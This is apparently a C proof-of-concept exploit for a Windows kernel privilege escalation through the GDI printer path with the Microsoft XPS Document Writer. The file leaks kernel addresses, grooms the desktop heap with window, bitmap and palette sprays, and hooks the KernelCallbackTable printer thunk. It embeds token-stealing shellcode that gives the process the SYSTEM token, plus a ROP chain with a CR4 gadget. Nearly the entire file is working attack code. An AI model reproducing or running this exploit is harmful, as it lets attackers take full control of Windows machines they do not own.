#include <windows.h>
//#include <wdm.h>
#include <ntstatus.h>
#include <stdio.h>
#include <winddi.h>
#include <winspool.h> 

#include <ntstatus.h>
#include "ntos.h"
#pragma comment(lib, "ntdll.lib")
#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
//#pragma comment(lib,"Ntoskrnl.lib")
typedef WNDOBJ(__stdcall* gEngCreateWnd)(SURFOBJ,HWND, WNDOBJCHANGEPROC,FLONG,INT);
typedef int(__fastcall* gNtGdiExtEscape)(HDC, PWCHAR, INT, INT, INT, LPSTR, INT, LPSTR);
typedef BOOL(__fastcall* gNextBand)(HDC,BOOL, POINTL*, PSIZE);
typedef BOOL(__fastcall* gNtGdiExtTextOutW)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT, DWORD);
typedef NTSTATUS(NTAPI* pUser32_ClientPrinterThunk)(PVOID p);
typedef BOOL(__fastcall* gNtGdiExtTextOut)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT);
typedef BOOL(__stdcall* gDrvEnableDriver)(ULONG, ULONG, DRVENABLEDATA*);
typedef void(_stdcall* gDrvDisableDriver)();
typedef NTSTATUS(__stdcall* pDrvEnableDriver)(PVOID p);
pDrvEnableDriver		g_originalDED = NULL;
PVOID g_ppDED = NULL;
typedef void(__stdcall* gNtGdiFlushUserBatch)();
typedef BOOL(__fastcall* gNtGdiDoBanding)(HDC,BOOL, POINTL,PSIZE);
typedef BOOL(__stdcall* hookFunction)(SURFOBJ,POINTL);


pUser32_ClientPrinterThunk		g_originalCPT = NULL;
PVOID g_ppCPT = NULL;
typedef BOOL(__fastcall* gNtGdiEndDoc)(HDC);
gNtGdiEndDoc ntgdiedobanding;
gNtGdiExtEscape g_NtGdiExtEscape;


typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	ULONG				 Reserved3;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 LoadCount;
	WORD                 NameOffset;
	CHAR                 Name[256];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;



typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);


typedef struct _HANDLEENTRY {
	PVOID  phead;
	ULONG_PTR  pOwner;
	BYTE  bType;
	BYTE  bFlags;
	WORD  wUniq;
}HANDLEENTRY, * PHANDLEENTRY;


typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD64 cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
}SERVERINFO, * PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PHANDLEENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelta;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
}SHAREDINFO, * PSHAREDINFO;
HDC hdc = NULL;
gDrvEnableDriver g_fake = NULL;
void* fDrvEnableDriver1 = NULL;
HDC g_hdc;


HDC hDc;
INT64 kernelBase;
HDC hMemDC;
static HBITMAP bitmaps[2000];
HWND hwnds[0x1000];
HWND g_window1 = NULL;
HWND g_window2 = NULL;
HWND g_window3 = NULL;
const WCHAR g_windowClassName1[] = L"Manager_Window";
const WCHAR g_windowClassName2[] = L"Worker_Window";
const WCHAR g_windowClassName3[] = L"Spray_Window";
WNDCLASSEX cls1;
WNDCLASSEX cls2;
WNDCLASSEX cls3;
DWORD64 g_ulClientDelta;
PSHAREDINFO g_pSharedInfo;
PSERVERINFO g_pServerInfo;
HANDLEENTRY* g_UserHandleTable;
DWORD64 g_pvDesktopBase;
PVOID leak_cbwndExtra;
#ifdef _WIN64
typedef void* (NTAPI* lHMValidateHandle)(HWND h, int type);
#else
typedef void* (__fastcall* lHMValidateHandle)(HWND h, int type);
#endif


lHMValidateHandle pHmValidateHandle = NULL;

typedef struct _DESKTOPINFO
{
	/* 000 */ PVOID        pvDesktopBase;
	/* 008 */ PVOID        pvDesktopLimit;

} DESKTOPINFO, * PDESKTOPINFO;
typedef struct _CLIENTINFO
{
	/* 000 */ DWORD             CI_flags;
	/* 004 */ DWORD             cSpins;
	/* 008 */ DWORD             dwExpWinVer;
	/* 00c */ DWORD             dwCompatFlags;
	/* 010 */ DWORD             dwCompatFlags2;
	/* 014 */ DWORD             dwTIFlags;
	/* 018 */ DWORD				filler1;
	/* 01c */ DWORD				filler2;
	/* 020 */ PDESKTOPINFO      pDeskInfo;
	/* 028 */ ULONG_PTR         ulClientDelta;

} CLIENTINFO, * PCLIENTINFO;
typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, * PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, * PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, * PTHRDESKHEAD;





LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc1(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		DebugBreak();
		((PDWORD64)0x1a000070)[0] = 0x333333;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc2(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		DebugBreak();
		((PDWORD64)0x1a000070)[0] = 0x111111;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc3(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

BOOL createWnd()
{
	cls1.cbSize = sizeof(WNDCLASSEX);
	cls1.style = 0;
	cls1.lpfnWndProc = WProc1;
	cls1.cbClsExtra = 0;
	cls1.cbWndExtra = 8;
	cls1.hInstance = NULL;
	cls1.hCursor = NULL;
	cls1.hIcon = NULL;
	cls1.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls1.lpszMenuName = NULL;
	cls1.lpszClassName = g_windowClassName1;
	cls1.hIconSm = NULL;

	if (!RegisterClassEx(&cls1))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls2.cbSize = sizeof(WNDCLASSEX);
	cls2.style = 0;
	cls2.lpfnWndProc = WProc2;
	cls2.cbClsExtra = 0;
	cls2.cbWndExtra = 8;
	cls2.hInstance = NULL;
	cls2.hCursor = NULL;
	cls2.hIcon = NULL;
	cls2.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls2.lpszMenuName = NULL;
	cls2.lpszClassName = g_windowClassName2;
	cls2.hIconSm = NULL;

	if (!RegisterClassEx(&cls2))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls3.cbSize = sizeof(WNDCLASSEX);
	cls3.style = 0;
	cls3.lpfnWndProc = WProc3;
	cls3.cbClsExtra = 0;
	cls3.cbWndExtra = 8;
	cls3.hInstance = NULL;
	cls3.hCursor = NULL;
	cls3.hIcon = NULL;
	cls3.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls3.lpszMenuName = NULL;
	cls3.lpszClassName = g_windowClassName3;
	cls3.hIconSm = NULL;

	if (!RegisterClassEx(&cls3))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	//perform the desktop heap feng shui
	DWORD size = 0x1000;
	
	HWND hWnd;
	for (DWORD i = 0; i < size; i++)
	{
		hWnd = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName3, L"Sprayer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);
		hwnds[i] = hWnd;
	}

	DestroyWindow(hwnds[0xE00]);

	g_window1 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName1, L"Manager", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window1 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	DestroyWindow(hwnds[0xE01]);
	g_window2 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName2, L"Worker", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window2 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL setupLeak()
{
	PTEB			teb = NtCurrentTeb();
	DWORD64 win32client = (DWORD64)teb->Win32ClientInfo;
	PCLIENTINFO pinfo = (PCLIENTINFO)win32client;
	g_ulClientDelta = pinfo->ulClientDelta;
	printf("ulClientDelta is: 0x%llx\n", g_ulClientDelta);
	PDESKTOPINFO pdesktop = pinfo->pDeskInfo;
	g_pvDesktopBase = (DWORD64)pdesktop->pvDesktopBase;
	g_pSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32.dll"), "gSharedInfo");
	g_UserHandleTable = g_pSharedInfo->aheList;
	g_pServerInfo = g_pSharedInfo->psi;

	return TRUE;
}

DWORD64 leakWnd(HWND hwnd)
{
	HWND kernelHandle = NULL;
	DWORD64 kernelAddr = NULL;

	for (int i = 0; i < g_pServerInfo->cHandleEntries; i++)
	{
		kernelHandle = (HWND)(i | (g_UserHandleTable[i].wUniq << 0x10));
		if (kernelHandle == hwnd)
		{
			kernelAddr = (DWORD64)g_UserHandleTable[i].phead;
			break;
		}
	}
	return kernelAddr;
}

INT64 getKernelBase() {
	printf("[+] Getting Kernel Base.\n");
	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		printf("[-] Fail to Load the function NtQuerySystemInformation\n");
		exit(1);
	}
	ULONG len = 0;
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	PRTL_PROCESS_MODULES pModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	if (status != (NTSTATUS)0x0) {
		printf("[-] NtQuerySystemInformation Fail\n");
		exit(1);
	}
	/*
	PVOID kernelImageBase = 0;
	for (int i = 0; i < pModuleInfo->NumberOfModules; i++) {
		kernelImageBase = pModuleInfo->Modules[i].ImageBase;
		printf("ntoskrnl.exe base addr: %p\n", kernelImageBase);

	}
	*/
	/*
	PVOID kernelImageBase = kernelImageBase = pModuleInfo->Modules[139].ImageBase;
	printf("win32kbase addr: %p\n", kernelImageBase);
	*/
	PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBase;
	printf("ntoskrnl.exe base addr: %p\n", kernelImageBase);
	return kernelImageBase;

}

static HBITMAP bitmaps[2000];
BOOL testData(SURFOBJ* pso, POINTL* pptl) {
	WNDOBJ* wdo;
	pptl->x = 0xffffffff;
	pptl->y = 0xffffffff;
	printf("Surfobj: %p\n", pso);
	printf("POINTL: %p\n", pptl);
	DebugBreak();



	BYTE shellcode[] =
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
		"\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
		"\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
		"\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
		//find_system_proc:
		"\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
		"\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
		"\x74\x05"                                  // jz found_system          ; Found SYSTEM token
		"\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
		"\xEB\xF1"                                  // jmp find_system_proc     ; Loop
		//found_system:
		"\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
		"\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
		"\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
		"\x48\x83\xC4\x40"                          // add rsp, 040h
		"\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
		"\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
		"\xc3";

	LPVOID shellcode_addr = VirtualAlloc(NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(shellcode_addr, shellcode, sizeof(shellcode));

	static HPALETTE hp1[2000];
	LOGPALETTE* rPalette;
	rPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0x1100 - 1) * sizeof(PALETTEENTRY));

	rPalette->palNumEntries = 0x1100;
	rPalette->palVersion = 0x0300;

	ntgdiedobanding(g_hdc);
	
	LOGPALETTE* lPalette;

	//0x1E3  = 0x7e8+8
	char buffer[2000];
	memset(buffer, 0x41414141, 2000);
	HBITMAP hmb;
	for (int i = 0; i < 2000; i++) {
		hmb=CreateBitmap(1, 30, 1, 32, &buffer);
		bitmaps[i] = hmb;
	}
	for (int s = 0; s < 2000; s++) {
		DeleteObject(bitmaps[s]);
	}
	INT64 vDelete = kernelBase + 0x8c128;

	
	lPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0xb4 - 1) * sizeof(PALETTEENTRY));

	lPalette->palNumEntries = 0xb4;

	
	lPalette->palVersion = 0x0300;
	static HPALETTE hp[2000];
	
	INT64 pop_rcx = kernelBase + 0x157CB1;
	INT64 mov_cr4 = kernelBase + 0x1d87d7;
	INT64 write_pointer = kernelBase + 0x1b7b;

	LPVOID ptr_jmpfunc = VirtualAlloc(NULL, 3000, MEM_RESERVE, PAGE_READWRITE); //reserving memory
	ptr_jmpfunc = VirtualAlloc(ptr_jmpfunc, 3000, MEM_COMMIT, PAGE_READWRITE); //commiting memory  
	LPVOID ptr1 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	LPVOID ptr2 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	LPVOID store_rop_shell = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	(store_rop_shell) = &pop_rcx;
	*(ULONG_PTR*)((PBYTE)store_rop_shell+8) = 0x70678;
	*(ULONG_PTR*)((PBYTE)store_rop_shell + 16) = store_rop_shell;
	*(ULONG_PTR*)((PBYTE)store_rop_shell + 24) = shellcode_addr;




	*(ULONG_PTR*)ptr_jmpfunc = 0x43415254;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x8) = ptr2;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x400) = (PBYTE)leak_cbwndExtra-3;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x304) = ptr2;
	*(ULONG_PTR*)((PBYTE)ptr1 + 0x30) = ptr2;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc +0x20) = ptr1;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x28) = (PBYTE)vDelete;
	printf("User mode control pointer: %p\n", ptr_jmpfunc);
	*(ULONG_PTR*)(lPalette->palPalEntry+4) = 0x444E5745;
	*(ULONG_PTR*)(lPalette->palPalEntry + 8) = ptr_jmpfunc;
	*(ULONG_PTR*)(lPalette->palPalEntry + 60) = (PBYTE)leak_cbwndExtra-0x58;



	HPALETTE h;
	for (int i = 0; i < 2000; i++) {
		h= CreatePalette(lPalette);
	
		//hp[i] = h;
	}
	
	
	for (int i = 0; i < 2000; i++) {
		DeleteObject(hp[i]);
	}
	for (int i = 0; i < 2300; i++) {
		h = CreatePalette(lPalette);

		//hp[i] = h;
	}





	
	//VirtualFree(ptr, 0, MEM_RELEASE);


	/*
	for (int i = 0; i <= 1000; i++) {
		HANDLE h=CreateCompatibleBitmap(hDc, 100, 100);
		SelectObject(hMemDC, h);
		printf("HBITMAP %d ", h);
	}
	*/
	
	return TRUE;
}



int i = 0;
NTSTATUS NTAPI hookCPT(
	PVOID p
)
{
	i++;
	if (i == 4) {
		BOOL(*testfn_ptr)() = &testData;
		MEMORY_BASIC_INFORMATION thunkMemInfo;
		PVOID c = ((PBYTE)p + 24);
		PVOID d = *((ULONG_PTR*)c);
		PVOID e = (PBYTE)d+16;
		PVOID f = *((ULONG_PTR*)e);
		PVOID g = *(ULONG_PTR*)f;
		PVOID h = (PBYTE)g+0x218;
		//PVOID f = &e + 0x218;

		if (!VirtualProtect(h, sizeof(PBYTE), PAGE_EXECUTE_READWRITE, &thunkMemInfo)) {
			printf("Fail to set Read-Write: %d\n", GetLastError());
		}
		*(ULONG_PTR*)h = (*testfn_ptr);
		
		printf("Pointer here: %p\n", &(BYTE)p);
	}




	return g_originalCPT(p);
}

DRVENABLEDATA pded;

int main() {
	LoadLibraryA("user32.dll");
	createWnd();
	setupLeak();
	DOCINFO docinfo;
	PTEB teb = NtCurrentTeb();

	PPEB peb = teb->ProcessEnvironmentBlock;
	DWORD prot;
	DWORD err = NULL;

	MEMORY_BASIC_INFORMATION thunkMemInfo;
	//RtlZeroMemory(&pded, sizeof(DRVENABLEDATA));
	printf("TEB: %p\n", teb);
	printf("PEB: %p\n", teb);
	RECT rect;
	POINTL pointL;
	LPXFORM pxf;
	PSIZE size;
	PERBANDINFO* ppbi;
	const XFORM* lpxf;
	HINSTANCE hinst = GetModuleHandle(NULL);;
	RtlZeroMemory(&pointL, sizeof(POINTL));
	kernelBase = getKernelBase();
	printf("Window1 is at: 0x%llx\n", leakWnd(g_window1));
	printf("Window2 is at: 0x%llx\n", leakWnd(g_window2));
	leak_cbwndExtra = leakWnd(g_window1) + 0xe8;
	printf("cbwndExtra leak: 0x%llx\n", leak_cbwndExtra);


	g_hdc = CreateDCA(0, "Microsoft XPS Document Writer", 0, 0);



	hMemDC = CreateCompatibleDC(hDc);


	printf("HDC: %p", g_hdc);
	docinfo.cbSize = sizeof(DOCINFO);
	docinfo.lpszDocName = TEXT("C:\\test\\test.txt");
	docinfo.lpszOutput = TEXT("C:\\test\\test.xps");
	docinfo.lpszDatatype = (LPTSTR)(0);
	docinfo.fwType = 0;




	HMODULE loadLib = LoadLibrary(TEXT("gdi32full.dll"));
	if (!loadLib) {
		printf("Load gdi32full error: %d", GetLastError());
	}
	gNextBand g_NextBand = (gNextBand)GetProcAddress(loadLib, "NtGdiDoBanding");
	if (!g_NextBand) {
		printf("Get function NextBand error: %d", GetLastError());
	}
	g_NtGdiExtEscape = (gNtGdiExtEscape)GetProcAddress(loadLib, "NtGdiExtEscape");
	if (!g_NtGdiExtEscape) {
		printf("Get function g_NtGdiExtTextOutW error: %d", GetLastError());
	}

	ntgdiedobanding = (gNtGdiEndDoc)GetProcAddress(loadLib, "NtGdiEndDoc");




	StartDocA(g_hdc, &docinfo);

	printf("StartDoc: %d\n", GetLastError());
	StartPage(g_hdc);
	printf("Start Page: %d\n", GetLastError());
	DebugBreak();
	//ExtEscape(g_hdc, WNDOBJ_SETUP, 8, (LPCSTR)&hWnd, 0, (LPSTR)NULL);


	//LPCSTR a = "Test String";
	//TextOutA(g_hdc, 0, 0, a, 11);
	g_ppCPT = &((PVOID*)peb->KernelCallbackTable)[0x67];
	if (!VirtualProtect(g_ppCPT, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot)) {
		printf("Fail in set read-write: %d", GetLastError());
	}




	g_originalCPT = InterlockedExchangePointer(g_ppCPT, &hookCPT);
	EndPage(g_hdc);
	



	DebugBreak();





	
	system("pause");
	return 0;
}